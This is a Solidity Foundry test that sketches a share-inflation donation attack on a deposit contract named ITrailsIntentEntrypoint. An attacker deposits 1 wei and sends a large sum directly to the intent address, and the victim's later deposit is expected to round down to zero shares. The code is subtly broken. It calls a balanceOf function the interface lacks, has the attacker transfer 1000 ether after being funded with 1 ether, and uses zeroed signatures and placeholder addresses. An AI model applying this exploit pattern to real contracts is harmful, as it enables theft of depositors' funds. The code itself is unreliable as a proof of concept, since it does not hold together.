// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/token/ERC20/extensions/draft-IERC20Permit.sol";

interface ITrailsIntentEntrypoint {
    function depositToIntentWithPermit(
        address user,
        address token,
        uint256 amount,
        uint256 permitAmount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 permitV,
        bytes32 permitR,
        bytes32 permitS,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external;

    function depositToIntent(
        address user,
        address token,
        uint256 amount,
        address intentAddress,
        uint256 deadline,
        uint256 nonce,
        uint256 feeAmount,
        address feeCollector,
        uint8 sigV,
        bytes32 sigR,
        bytes32 sigS
    ) external;
}

contract ExploitTest is Test {
    ITrailsIntentEntrypoint vault;
    IERC20 token;
    address attacker;
    address victim;
    address intentAddress;

    function setUp() public {
        // Deploy or fork contracts
        // Assume vault and token are already deployed and addresses are known
        vault = ITrailsIntentEntrypoint(0x1234567890abcdef1234567890abcdef12345678);
        token = IERC20(0xabcdefabcdefabcdefabcdefabcdefabcdefabcdef);

        // Set initial state
        attacker = address(0x1);
        victim = address(0x2);
        intentAddress = address(0x3);

        // Fund accounts
        deal(address(token), attacker, 1 ether);
        deal(address(token), victim, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Attacker deposits a minimal amount to mint 1 wei of a share
        vm.prank(attacker);
        token.approve(address(vault), 1);
        vault.depositToIntent(attacker, address(token), 1, intentAddress, block.timestamp + 1 days, 0, 0, address(0), 0, bytes32(0), bytes32(0));

        // Step 2: Attacker transfers a large amount of assets directly to the vault
        vm.prank(attacker);
        token.transfer(intentAddress, 1000 ether);

        // Step 3: Victim attempts to deposit, expecting to receive shares
        vm.prank(victim);
        token.approve(address(vault), 1 ether);
        vault.depositToIntent(victim, address(token), 1 ether, intentAddress, block.timestamp + 1 days, 0, 0, address(0), 0, bytes32(0), bytes32(0));

        // Assert the vulnerability: Victim's share calculation rounds down to 0
        // Assuming the vault has a function to check shares, e.g., balanceOf
        uint256 victimShares = vault.balanceOf(victim);
        assertEq(victimShares, 0, "Victim's shares should be 0 due to rounding down");
    }
}